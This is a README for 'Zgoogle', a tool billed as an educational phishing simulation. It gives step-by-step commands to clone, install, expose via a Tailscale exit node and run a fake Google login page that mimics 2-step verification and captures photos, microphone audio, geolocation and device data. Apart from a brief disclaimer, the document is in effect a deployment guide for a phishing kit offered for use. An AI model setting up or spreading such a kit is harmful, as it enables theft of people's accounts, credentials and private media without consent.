<div align="center">
  <img src="https://i.imgur.com/3mlHQfU.png" alt="Zgoogle Logo" width="180">
</div>

<h1 align="center">🛡️ Zgoogle – Google Phishing Simulation Page 🎭</h1>

<p align="center">
  <b>An educational cybersecurity-awareness simulator</b><br>
  Demonstrates how phishing pages can mimic Google login screens and attempt to capture photos, audio, geolocation, and device information 🌐📸🎤📍.<br>
  Built to show how attackers may trick users—even around 2‑step verification prompts—for training and awareness purposes only 🔒⚠️.
</p>

<hr>

<h2>📅 Release Date</h2>
<p>Uploaded on: <b>2025-11-22</b></p>

<hr>

<h2>🚀 Installation & Usage Guide (Educational Simulation Only)</h2>

<h3>1️⃣ Clone the Repository</h3>
<pre><code class="language-bash">
git clone https://github.com/zarga33d/Zgoogle.git
</code></pre>

<h3>2️⃣ Navigate to the Project Folder</h3>
<pre><code class="language-bash">
cd Zgoogle
</code></pre>

<h3>3️⃣ Install Required Libraries</h3>
<pre><code class="language-bash">
pip3 install -r requirements.txt
</code></pre>

<hr>

<h2>🔐 (Optional) Tailscale Installation for Internal Testing</h2>
<p>Used only for secure internal demo environments (NOT for distribution to real users).</p>

<h3>4️⃣ Install Tailscale</h3>
<pre><code class="language-bash">
curl -fsSL https://tailscale.com/install.sh | sh
</code></pre>

<h3>5️⃣ Start Tailscale</h3>
<pre><code class="language-bash">
sudo tailscale up
</code></pre>

<h3>6️⃣ Enable Exit Node & Routes</h3>
<pre><code class="language-bash">
sudo tailscale set --accept-routes=true --advertise-exit-node
</code></pre>

<hr>

<h2>▶️ Run the Simulation</h2>
<p>Run the demo locally for cybersecurity awareness training:</p>

<pre><code class="language-bash">
sudo python3 google.py
</code></pre>

<p><b>⚠️ Must be run locally and only on machines you own.</b></p>

<hr>

<h2>⚡ Features (Simulation Only)</h2>
<ul>
  <li>✔ Demonstrates realistic phishing UI behavior</li>
  <li>✔ Simulated camera & microphone request flow</li>
  <li>✔ Simulated device & location data collection</li>
  <li>✔ Shows how attackers may mimic 2‑step pages</li>
  <li>✔ Useful for awareness training & demonstrations</li>
</ul>

<hr>

<h2>📌 Disclaimer</h2>
<p style="color:#ff3333;">
This project is an <b>educational phishing simulation</b> intended for training and awareness only.<br>
It must <b>NOT</b> be deployed, shared, sent, emailed, or messaged to real users under any circumstances.<br>
Unauthorized phishing is illegal and punishable by law.<br><br>
The developer (<b>zarga</b>) is <b>not responsible</b> for any misuse, damage, or illegal activity associated with this simulation.
</p>

<hr>

<h3 align="center">💻 Developed by zarga | GitHub: @zarga33d</h3>
